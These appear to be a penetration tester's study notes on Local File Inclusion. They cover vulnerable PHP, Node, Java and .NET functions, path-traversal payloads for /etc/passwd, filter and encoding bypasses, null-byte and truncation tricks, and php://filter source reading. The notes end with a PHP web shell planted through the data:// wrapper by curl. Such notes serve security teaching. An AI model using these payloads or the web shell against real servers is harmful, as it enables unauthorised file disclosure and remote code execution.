```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Local File Inclusion
This is most common within templating engines (eg. `/index.php?page=about`), these engines allow static content like a header and footer to be centralised and then the main content is just dynamically templated in. Some key code examples to investigate for possible LFI:
### Code Examples
#### PHP
```PHP
include();
include_once();
require();
require_once();
file_get_contents();
```
#### NodeJS
```js
readFile();
render();
```
#### Java
```jsp
<jsp:include file ... />
<c:import url ... />
```
#### .Net
```cs
Response.WriteFile()
@Html.Partial()
@Html.RemotePartial()
#include file=...
```

Some of these methods not only read the file but also execute it, some even read remote URLs so there is further abuse we can cause:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|
### Basic LFI
> Very often we need to make sure to URL encode queries as `/` becomes `%2f`.
#### Absolute Path
Sometimes an **absolute path** will just work: `/etc/password`. 
#### Path Traversal
However, it could be getting prefixed with a path for instance eg. 
```php
include("./pages/" . $_GET["lang"]);
```
This would mean we end up with `./pages//etc/passwd`, we can use path traversal here instead: `../../../../etc/passwd`.
> As `../` at root doesn't actually break anything, we can add loads and later find out the minimum needed when we write the report.
#### Filename Prefixed
```php
include("lang_" . $_GET["lang"]);
```
We can avoid this by prefixing our input with a `/` so its `/../../../../etc/password`. This will make it think `lang_/` is a directory instead now and then we will bypass it with the `../`'s.
> This isn't greatly reliable however.
#### Extension Suffixed
```php
include($_GET["lang"] . ".php");
```
In modern PHP web applications this is very hard to bypass and could restrict us to only reading files with the appended suffix. However, this may still allow us to read source code for example (*which we could still run vuln scans on to find other issues we could exploit*).

With older PHP apps (*pre-v5.3*) there are still some techniques that could be used. In some versions, defined strings had a max length of 4096 chars, anything more would be truncated, so we could pass a longer string and have it truncated. PHP also used to remove trailing `.`'s and `/`'s in paths. PHP and Linux also ignore multiple prefixed `/`'s (`////etc/passwd`). PHP also disregards any current directory shortcuts in the middle of strings: `/etc/./passwd`.
> For this truncation technique to work, we have to start with a non-existent directory

This command creates the full string:
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

Before PHP v5.5, a *null byte injection* vulnerability was present. When a null byte (`%00`) was added to the end of a string, PHP would terminate it and not consider anything afterwards. We could use a payload such as `/etc/passwd%00`, which would then become `include("/etc/passwd%00.php");`, it would still get processed as `/etc/passwd`. 
### Second-Order Attacks
Another common method, but slightly more advanced is a *Second-Order Attack*. This is where a web application insecurely pulls files from a back-end server based on user-controlled parameters. For example, a web app could get a user's profile picture from `/profile/$username/avatar.png`. The user themselves doesn't control the actual query but they do control their username, thus if their username was `../../../etc/password`, this would become `/profile/../../../etc/password/avatar.png`. This in itself isn't isn't the full attack but could be a leading factor.
> Developers can often trust values coming from their database but if those values are user-controlled then they can't be trusted.

### Basic Bypasses
#### Non-Recursive Path Traversal Filters
A very common protection is to replace `../` with a empty string.
```php
$lang = str_replace('../', '', $_GET['lang']);
```
As this isn't recursive, we can bypass this by making it form the `../` for us using `....//`.
We can also use `..././` or `....\/`, these will both have the same result. Adding more `/`'s (`....////`) or escaping the `/` (`....\/`) can also sometimes bypass these filters.
#### Encoding
We can sometimes get away with URL encoding the entire string:
```
../../../etc/passwd = %2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
> Burp Decoder can do this easily. We can also double encode this string to bypass other filters.
#### Approved Paths
Some applications with use regex to ensure an input is only within approved paths:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['lang'])) {
	include($_GET['lang']);
} else {
	echo 'Illegal path specified';
}
```
We must first examine the application's normal behaviour to understand what paths are approved, then we can use an approved path first alongside `../` to escape it afterwards: `/languages/../../../../etc/passwd`.

### PHP Filters
These are a type of [PHP Wrapper](https://www.php.net/manual/en/wrappers.php.php), where you can pass different types of inputs and have it filtered by the filter we specify. We can use the PHP wrapper scheme `php://filter/` to access the filter wrapper. The wrapper has several parameters, but the main ones are *resource* and *read*. With *resource*, we can specify we want to apply the filter to the local file stream, whilst the *read* parameter allows us to specify we want to apply the resource.

There is four types of filters available to us here: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). The important filter for LFI attacks is the `convert.base64-encode`, under *Conversion Filters*. We want this filter so we get the source code and not execute it instead.

The first step is to [[ffuf#Page Fuzzing|fuzz]] for php files that we might want to read, we aren't limited to ones that return a `200` too, so `301`, `302`, and `403` are all valid codes to look for. Once we have a list of files we want to view, we can use `php://filter/read=convert.base64-encode/resource=config.php` (*for `config.php`*). This may need to be modified (eg. remove the extension) if there are other filtering protections in place.

## RCE Through LFI
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to load external data, including PHP code. Like many other LFI attacks, this wrapper is only available if the `allow_url_include` setting is enabled in the PHP configuration (*This is NOT enabled by default*). To check this we can use LFI to include the PHP config file (Apache2: `/etc/php/[version X.Y]/apache2/php.ini`, Nginx: `/etc/php/[version X.Y]/fpm/php.ini`). We can iterate through the PHP version until we find the correct one. 
> We should also use the `convert.base64-encode` filter as the `.ini` file should be encoded when sent. We can then decode to see if the setting is enabled.

We can then use the `data://` wrapper to upload something like a webshell command:
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
Then upload it via an LFI attack:
```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```